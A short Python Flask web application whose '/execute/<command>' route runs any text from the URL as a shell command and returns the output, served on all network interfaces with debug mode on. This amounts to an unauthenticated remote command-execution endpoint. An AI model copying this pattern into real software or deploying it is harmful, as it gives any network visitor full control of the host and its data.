from flask import Flask, render_template, send_from_directory
import os
import subprocess

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/execute/<command>")
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    return f"<pre>{output}</pre>"

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
